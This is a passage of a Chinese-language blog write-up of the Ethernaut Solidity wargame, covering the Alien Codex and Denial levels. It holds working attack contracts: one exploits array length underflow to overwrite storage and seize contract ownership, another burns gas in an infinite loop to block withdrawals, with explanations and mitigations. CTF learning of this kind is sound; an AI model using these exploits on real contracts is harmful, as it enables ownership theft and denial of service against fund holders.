<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IAlienCodex</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">makeContact</span>(<span class="params"></span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">retract</span>(<span class="params"></span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">revise</span>(<span class="params">uint256 i, bytes32 _content</span>) external;</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">owner</span>(<span class="params"></span>) external view returns (address);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">AlienCodexSolution</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">attack</span>(<span class="params">address _target</span>) public {</span><br><span class="line">        <span class="title class_">IAlienCodex</span> target = <span class="title class_">IAlienCodex</span>(_target);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第一步：建立联系，通过 'contacted' 修饰符检查</span></span><br><span class="line">        target.<span class="title function_">makeContact</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第二步：触发数组下溢</span></span><br><span class="line">        <span class="comment">// 初始长度为 0，调用 retract() 后长度变为 2^256 - 1。</span></span><br><span class="line">        <span class="comment">// 这使得数组覆盖了整个存储空间。</span></span><br><span class="line">        target.<span class="title function_">retract</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第三步：计算对应 Slot 0 的数组索引 'i'。</span></span><br><span class="line">        <span class="comment">// 数组数据起始位置是 keccak256(slot_of_length)。</span></span><br><span class="line">        <span class="comment">// slot_of_length 是 1 (Slot 0 是 owner+contact, Slot 1 是 codex.length)。</span></span><br><span class="line">        <span class="comment">// 我们需要满足：keccak256(1) + i = 0 (mod 2^256)</span></span><br><span class="line">        <span class="comment">// 所以：i = 0 - keccak256(1)</span></span><br><span class="line">        </span><br><span class="line">        uint256 h;</span><br><span class="line">        unchecked {</span><br><span class="line">            h = <span class="title function_">uint256</span>(<span class="title function_">keccak256</span>(abi.<span class="title function_">encode</span>(<span class="title function_">uint256</span>(<span class="number">1</span>))));</span><br><span class="line">        }</span><br><span class="line">        </span><br><span class="line">        uint256 i;</span><br><span class="line">        unchecked {</span><br><span class="line">            i -= h; <span class="comment">// 相当于 0 - h</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 第四步：覆盖 Slot 0 为我们的地址。</span></span><br><span class="line">        <span class="comment">// Slot 0 包含：[contact (1 byte) | ... padding ... | owner (20 bytes)]</span></span><br><span class="line">        <span class="comment">// 写入 bytes32(uint256(uint160(msg.sender))) 会将地址放在低 20 字节，</span></span><br><span class="line">        <span class="comment">// 正好对应 'owner' 的位置。</span></span><br><span class="line">        target.<span class="title function_">revise</span>(i, <span class="title function_">bytes32</span>(<span class="title function_">uint256</span>(<span class="title function_">uint160</span>(msg.<span class="property">sender</span>))));</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 验证攻击结果</span></span><br><span class="line">        <span class="built_in">require</span>(target.<span class="title function_">owner</span>() == msg.<span class="property">sender</span>, <span class="string">"Attack failed"</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这里为了看懂合约，先了解几个概念：</p>
<p><strong><code>keccak256(abi.encode(uint256(1)))</code> 为什么要有一个abi.encode呢？</strong></p>
<blockquote>
<p>这是因为 <code>keccak256</code> 函数的参数要求，在 Solidity 中，<code>keccak256</code> 哈希函数<strong>只接受 bytes 类型</strong>作为输入。</p>
<p><strong>1. <code>keccak256</code> 的签名</strong></p>
<p>它的定义类似于：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">function keccak256(bytes memory data) returns (bytes32)</span><br></pre></td></tr></table></figure></div>

<p><strong>2. 我们的目标</strong></p>
<p>我们想要计算的是：<strong>数字 1 的哈希值</strong>。<br>因为动态数组的长度存储在 Slot 1，而数组内容的起始位置是 <code>keccak256(Slot 1 的位置)</code>，也就是 <code>keccak256(1)</code>。</p>
<p><strong>3. 为什么不能直接传 1？</strong></p>
<p>如果你写 <code>keccak256(1)</code>，编译器会报错，因为 <code>1</code> 是一个整数 (<code>uint</code>)，不是字节数组 (<code>bytes</code>)。</p>
<p><strong>4. <code>abi.encode</code> 的作用</strong></p>
<p><code>abi.encode(...)</code> 的作用就是把任何类型的数据（比如数字、地址、字符串）<strong>打包编码成 bytes 类型</strong>。</p>
<ul>
<li><code>abi.encode(uint256(1))</code> 会把数字 1 转换成一个 32 字节长的字节数组：<br><code>0x0000000000000000000000000000000000000000000000000000000000000001</code></li>
</ul>
<p>这样，<code>keccak256</code> 就能接受这个字节数组并计算哈希值了。</p>
</blockquote>
<p><strong>数组的元素为什么从 keccak256(1) 开始存储？</strong></p>
<blockquote>
<p>这是 Solidity 语言规范中定义的<strong>动态数组存储规则</strong>。</p>
<p><strong>静态 vs 动态</strong></p>
<ul>
<li><strong>静态变量</strong>（如 <code>uint a</code>, <code>address b</code>）是按顺序一个接一个地放在 Slot 0, Slot 1, Slot 2… 里的。</li>
<li><strong>动态数组</strong>（如 <code>bytes32[] codex</code>）的大小是不确定的，它可能会非常大，甚至无限大。如果把它直接塞在 Slot 序列中间（比如 Slot 1），它一旦变长，就会覆盖掉后面的 Slot 2, Slot 3… 里的其他变量。</li>
</ul>
<p><strong>Solidity 的解决方案</strong></p>
<p>为了解决这个问题，Solidity 采用了一种“<strong>分散存储</strong>”的策略：</p>
<ol>
<li>**占位符 (Slot p)<strong>：<br>在定义数组的地方（比如 Slot 1），只存储一个数字：</strong>数组的长度 (length)**。<ul>
<li>对于 <code>codex</code> 数组，它的长度就存在 <strong>Slot 1</strong>。</li>
</ul>
</li>
<li>**实际数据 (Data)**：<br>数组里的具体元素（<code>codex[0]</code>, <code>codex[1]</code>…）被“踢”到了存储空间的一个非常遥远、随机的角落，以免干扰其他变量。<ul>
<li>这个角落的起始地址就是通过哈希计算出来的：**keccak256(p)**。</li>
<li>在这里，<code>p</code> 是存储长度的 Slot 编号（即 1）。</li>
<li>所以起始地址 = <code>keccak256(1)</code>。</li>
</ul>
</li>
</ol>
<p><strong>寻址公式</strong></p>
<ul>
<li><code>codex[0]</code> 存在 <code>keccak256(1) + 0</code></li>
<li><code>codex[1]</code> 存在 <code>keccak256(1) + 1</code></li>
<li><code>codex[i]</code> 存在 <code>keccak256(1) + i</code></li>
</ul>
<p><strong>总结：</strong><br>为了不让变长的数组挤占其他变量的位置，Solidity 把数组内容扔到了一个由哈希决定的“远方”，只在原地留了一个“长度”作为路牌。</p>
</blockquote>
<p><strong>代码里面为什么要有一个unchecked？</strong></p>
<blockquote>
<p>这是因为我们在进行<strong>溢出运算</strong>。</p>
<p><strong>1. 我们的目标</strong></p>
<p>我们需要计算一个索引 <code>i</code>，使得：<br><code>keccak256(1) + i = 0</code> (在模 22562256 的意义下)</p>
<p>换句话说，我们想要让数组的某个元素“绕地球一圈”，正好落在地址 <code>0</code> (Slot 0) 上。</p>
<p>根据简单的代数变换：<br><code>i = 0 - keccak256(1)</code></p>
<p><strong>2. Solidity 0.8.0+ 的安全检查</strong></p>
<p>我们的攻击代码是用 Solidity <code>^0.8.0</code> 写的。<br>从 Solidity 0.8.0 开始，编译器默认开启了<strong>算术溢出/下溢检查</strong>。</p>
<ul>
<li>如果你尝试计算 <code>0 - 100</code>，程序会直接报错 (Revert)，因为它认为这是一个错误（负数在 <code>uint</code> 中是不存在的）。</li>
</ul>
<p><strong>3. <code>unchecked</code> 的作用</strong></p>
<p>但在我们的攻击逻辑中，我们<strong>故意</strong>想要发生下溢。</p>
<ul>
<li>我们希望 <code>0 - keccak256(1)</code> 变成一个巨大的正整数（即 2256−keccak256(1)2256−keccak256(1)）。</li>
</ul>
<p><code>unchecked { ... }</code> 代码块告诉编译器：</p>
<blockquote>
<p>“在这个大括号里，<strong>不要检查</strong>溢出或下溢。如果算出来是负数，就让它自动绕回到巨大的正数去，不要报错。”</p>
</blockquote>
<p><strong>总结：</strong><br>没有 <code>unchecked</code>，<code>0 - h</code> 会导致交易失败。我们需要它来允许这种“数学上不合理但黑客需要”的计算。</p>
</blockquote>
<p><strong>最后截图：</strong></p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2025-12-18_23-18-50.png" alt="nipaste_2025-12-18_23-18-5"></p>
<h2 id="20-Denial"><a href="#20-Denial" class="headerlink" title="20. Denial"></a>20. Denial</h2><h3 id="Gas-转发机制"><a href="#Gas-转发机制" class="headerlink" title="Gas 转发机制"></a><code>Gas 转发机制</code></h3><blockquote>
<p>This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>
<p>If you can deny the owner from withdrawing funds when they call <code>withdraw()</code> (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p>
</blockquote>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">Denial</span> {</span><br><span class="line">    address public partner; <span class="comment">// withdrawal partner - pay the gas, split the withdraw</span></span><br><span class="line">    address public constant owner = <span class="title function_">address</span>(<span class="number">0xA9E</span>);</span><br><span class="line">    uint256 timeLastWithdrawn;</span><br><span class="line">    <span class="title function_">mapping</span>(<span class="function"><span class="params">address</span> =&gt;</span> uint256) withdrawPartnerBalances; <span class="comment">// keep track of partners balances</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setWithdrawPartner</span>(<span class="params">address _partner</span>) public {</span><br><span class="line">        partner = _partner;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// withdraw 1% to recipient and 1% to owner</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params"></span>) public {</span><br><span class="line">        uint256 amountToSend = <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span> / <span class="number">100</span>;</span><br><span class="line">        <span class="comment">// perform a call without checking return</span></span><br><span class="line">        <span class="comment">// The recipient can revert, the owner will still get their share</span></span><br><span class="line">        partner.<span class="property">call</span>{<span class="attr">value</span>: amountToSend}(<span class="string">""</span>);</span><br><span class="line">        <span class="title function_">payable</span>(owner).<span class="title function_">transfer</span>(amountToSend);</span><br><span class="line">        <span class="comment">// keep track of last withdrawal time</span></span><br><span class="line">        timeLastWithdrawn = block.<span class="property">timestamp</span>;</span><br><span class="line">        withdrawPartnerBalances[partner] += amountToSend;</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="comment">// allow deposit of funds</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable {}</span><br><span class="line"></span><br><span class="line">    <span class="comment">// convenience function</span></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">contractBalance</span>(<span class="params"></span>) public view returns (uint256) {</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_">address</span>(<span class="variable language_">this</span>).<span class="property">balance</span>;</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这个关卡的目标是阻止所有者（owner）从合约中提取资金。漏洞在于 <code>withdraw</code> 函数中对 <code>partner</code> 的外部调用处理不当，导致可以利用 Gas 耗尽攻击来回滚整个交易。</p>
<p><strong>漏洞分析</strong></p>
<ol>
<li><p><strong>未检查的外部调用 (Unchecked External Call)</strong>:<br>合约执行了 <code>partner.call{value: amountToSend}("")</code>。<br>这种低级 <code>call</code> 默认会把当前剩余 Gas 的 <strong>63/64</strong> 转发给被调用的合约 (<code>partner</code>)。</p>
</li>
<li><p><strong>Gas 耗尽攻击 (Gas Exhaustion)</strong>:<br>如果 <code>partner</code> 是一个恶意合约，它可以在 <code>receive()</code> 函数中执行一个死循环（或者其他极其耗费 Gas 的操作），把这转发过来的 63/64 的 Gas 全部烧光。</p>
</li>
<li><p><strong>剩余 Gas 不足</strong>:<br>当 <code>partner.call</code> 因为 Gas 耗尽而返回时，<code>Denial</code> 合约只剩下原本 Gas 的 <strong>1/64</strong>。<br>接下来的操作包括：</p>
<ul>
<li><code>payable(owner).transfer(...)</code>: 转账操作。</li>
<li><code>timeLastWithdrawn = ...</code>: 修改存储变量 (SSTORE)，非常昂贵。</li>
<li><code>withdrawPartnerBalances[...] += ...</code>: 读取并修改存储 (SLOAD + SSTORE)，非常昂贵。</li>
</ul>
<p>题目提到交易 Gas 上限是 100万 (1M)。1M 的 1/64 大约是 15,625 Gas。这通常不足以支付后续的转账和两次存储写入操作。因此，主合约也会因为 Gas 不足 (Out of Gas) 而抛出异常，导致整个交易（包括给 owner 的转账）全部回滚。</p>
</li>
</ol>
<div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SPDX-License-Identifier: MIT</span></span><br><span class="line">pragma solidity ^<span class="number">0.8</span><span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">interface <span class="title class_">IDenial</span> {</span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setWithdrawPartner</span>(<span class="params">address _partner</span>) external;</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">contract <span class="title class_">DenialAttack</span> {</span><br><span class="line">    <span class="comment">// 当 Denial 合约调用这个函数时，它会转发 63/64 的 Gas。</span></span><br><span class="line">    <span class="comment">// 通过进入死循环，我们烧掉所有转发过来的 Gas。</span></span><br><span class="line">    <span class="comment">// 剩下的 1/64 Gas 退回到 Denial 合约后，不足以完成后续的操作</span></span><br><span class="line">    <span class="comment">// (如转账给 owner 和修改存储变量)，导致整个交易因为 Out of Gas 而回滚。</span></span><br><span class="line">    <span class="title function_">receive</span>() external payable {</span><br><span class="line">        <span class="comment">// 死循环以消耗所有 Gas</span></span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) {}</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">function</span> <span class="title function_">setPartner</span>(<span class="params">address _target</span>) public {</span><br><span class="line">        <span class="title class_">IDenial</span>(_target).<span class="title function_">setWithdrawPartner</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></div>

<p>这个题目（Denial）主要考察了以下几个核心知识点：</p>
<ol>
<li>**外部调用与 Gas 转发机制 (External Calls &amp; Gas Forwarding)**：<ul>
<li>考察你是否知道 Solidity 的低级 <code>call</code> 默认会转发当前剩余 Gas 的 <strong>63/64</strong> 给被调用者。</li>
<li>这是 EIP-150 引入的规则，目的是防止调用栈过深导致的攻击，同时也保留了一小部分 Gas 给调用者处理返回结果。</li>
</ul>
</li>
<li>**重入攻击的变种 (DoS via External Call)**：<ul>
<li>虽然这不是典型的“修改状态导致的重入”，但它利用了外部调用的控制权转移。</li>
<li>这是一种 <strong>拒绝服务 (Denial of Service, DoS)</strong> 攻击。攻击者利用被调用的机会，故意消耗资源，导致主合约逻辑无法继续执行。</li>
</ul>
</li>
<li>**错误处理与交易回滚 (Error Handling &amp; Revert)**：<ul>
<li>考察你是否理解：虽然 <code>call</code> 本身返回 <code>false</code> 不会直接导致主合约 revert（除非代码里写了 <code>require(success)</code>），但如果主合约<strong>后续的操作</strong>因为资源不足（Out of Gas）而失败，那么<strong>整个交易</strong>都会回滚。</li>
<li>在这个例子中，<code>call</code> 失败本身被忽略了（代码里没有检查返回值），但正是因为 <code>call</code> 消耗了太多资源，导致后面的代码跑不动了。</li>
</ul>
</li>
<li>**CEI 模式的重要性 (Checks-Effects-Interactions)**：<ul>
<li>如果合约严格遵守“检查-生效-交互”模式，即先修改状态（扣款、记账），最后再进行外部调用（转账），那么即使外部调用耗尽了 Gas，之前的状态修改可能已经完成（或者至少不会被外部调用的恶意行为阻塞得这么容易，虽然 Out of Gas 依然会导致整体回滚，但逻辑上更清晰）。</li>
<li>不过对于 Gas 耗尽这种 DoS，即使调整顺序也较难完全防御，通常需要限制转发的 Gas 量（例如 <code>call{gas: 50000}(...)</code>）。</li>
</ul>
</li>
</ol>
<p>最后结果如下：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2026-01-29_01-10-01.png" alt="nipaste_2026-01-29_01-10-0"></p>

        </div>

        
            <div class="post-copyright-info my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> ethernaut chall Part.I</li>
        <li><strong>Author:</strong> henry</li>
        <li><strong>Created at
                :</strong> 2026-01-29 00:46:53</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2026-01-29 01:11:54
            </li>
        
        <li>
            <strong>Link:</strong> https://henrymartin262.github.io/2026/01/29/ethereum_challenge/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/solidity/">#solidity</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/ether/">#ether</a>&nbsp;
                    </li>
                
                    <li class="tag-item">
                        <a href="/tags/security/">#security</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                
                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="next"
                        rel="next"
                        href="/2025/06/13/CVE-2025-21756/"
                        >
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">CVE-2025-21756 漏洞复现及利用</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container pjax">
    <div id="comment-anchor"></div>
    <div class="comment-area-title">
        <i class="fa-solid fa-comments"></i>&nbsp;Comments
    </div>
    

        
            
    <div id="waline"></div>
    <script type="module" data-swup-reload-script>
      import { init } from '/js/libs/waline.mjs';

      function loadWaline() {
        init({
          el: '#waline',
          serverURL: 'https://example.example.com',
          lang: 'zh-CN',
          dark: 'body[class~="dark-mode"]',
          requiredMeta: ['nick', 'mail']
        });
      }

      if (typeof swup !== 'undefined') {
        loadWaline();
      } else {
        window.addEventListener('DOMContentLoaded', loadWaline);
      }
    </script>



        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">On this page</div>
        <div class="page-title">ethernaut chall Part.I</div>
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0-Hello-Ethernaut"><span class="nav-text">0. Hello Ethernaut</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Fallback"><span class="nav-text">1. Fallback</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Fallout"><span class="nav-text">2. Fallout</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-Coin-Flip"><span class="nav-text">3. Coin Flip</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#4-Telephone"><span class="nav-text">4. Telephone</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#msg-sender-tx-origin-%E8%BE%A8%E6%9E%90"><span class="nav-text">msg.sender &amp; tx.origin 辨析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#5-Token"><span class="nav-text">5. Token</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Interger-Overflow-%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA"><span class="nav-text">Interger Overflow 整数溢出</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-Delegation"><span class="nav-text">6. Delegation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#delegatecall%EF%BC%88%E5%A7%94%E6%89%98%E8%B0%83%E7%94%A8%EF%BC%89"><span class="nav-text">delegatecall（委托调用）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-Force"><span class="nav-text">7. Force</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#selfdestruct-%E8%87%AA%E6%AF%81"><span class="nav-text">selfdestruct (自毁)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8-Vault"><span class="nav-text">8. Vault</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#private%E5%8F%98%E9%87%8F%E5%8F%AF%E8%AF%BB"><span class="nav-text">private变量可读</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#9-King"><span class="nav-text">9. King</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#transfer-%E5%87%BD%E6%95%B0-%E6%8B%92%E7%BB%9D%E8%BD%AC%E8%B4%A6"><span class="nav-text">transfer 函数 &amp; 拒绝转账</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-Re-entrancy"><span class="nav-text">10. Re-entrancy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Checks-Effects-Interactions"><span class="nav-text">Checks-Effects-Interactions</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-Elevator"><span class="nav-text">11. Elevator</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#external-%E7%9A%84%E5%8D%B1%E5%AE%B3"><span class="nav-text">external 的危害</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#12-Privacy"><span class="nav-text">12. Privacy</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#solidity-%E5%86%85%E5%AD%98%E5%B8%83%E5%B1%80"><span class="nav-text">solidity 内存布局</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-Gatekeeper-One"><span class="nav-text">13. Gatekeeper One</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD"><span class="nav-text">逻辑判断</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-Gatekeeper-Two"><span class="nav-text">14. Gatekeeper Two</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%BB%E8%BE%91%E5%88%A4%E6%96%AD-1"><span class="nav-text">逻辑判断</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-Naught-Coin"><span class="nav-text">15. Naught Coin</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#transferFrom-ERC20"><span class="nav-text">transferFrom &amp; ERC20</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-Preservation"><span class="nav-text">16. Preservation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#delegatecall-%E5%A7%94%E6%89%98%E8%B0%83%E7%94%A8"><span class="nav-text">delegatecall (委托调用)</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#17-Recovery"><span class="nav-text">17. Recovery</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#new-RLP-%E5%9C%B0%E5%9D%80%E7%A1%AE%E5%AE%9A"><span class="nav-text">new RLP 地址确定</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#18-MagicNumber"><span class="nav-text">18. MagicNumber</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EVM-%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">EVM 字节码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-Alien-Codex"><span class="nav-text">19. Alien Codex</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#integer-overflow-%E5%8A%A8%E6%80%81%E6%95%B0%E7%BB%84%E5%AD%98%E5%82%A8"><span class="nav-text">integer overflow &amp; 动态数组存储</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-Denial"><span class="nav-text">20. Denial</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Gas-%E8%BD%AC%E5%8F%91%E6%9C%BA%E5%88%B6"><span class="nav-text">Gas 转发机制</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2026&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">henry</a>
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.6</a></span>
        </div>
        
        
            <div>
